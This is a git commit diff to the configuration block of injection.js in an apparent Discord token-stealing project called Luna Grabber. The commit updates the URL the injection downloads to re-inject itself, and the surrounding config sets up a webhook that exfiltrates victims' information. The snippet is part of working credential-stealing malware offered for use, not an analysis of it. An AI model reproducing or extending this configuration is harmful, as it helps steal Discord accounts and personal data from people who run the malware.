4a3ce2b96b9524f3f39c478acc5cbaac78a979fc
Smug <99215486+Smug246@users.noreply.github.com>
2022-07-13 02:04:59 +0100

    Update injection.js

--- injection.js
+++ injection.js
@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Luna Injection', //name of the webhook thats gonna send the info
   embed_icon: 'https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 5639644, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: 'https://raw.githubusercontent.com/Smug246/Luna-Token-Grabber/main/injection.js', //injection url for when it reinjects
+  injection_url: 'https://raw.githubusercontent.com/Smug246/Luna-Grabber/main/injection.js', //injection url for when it reinjects
   /**
    * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
    **/
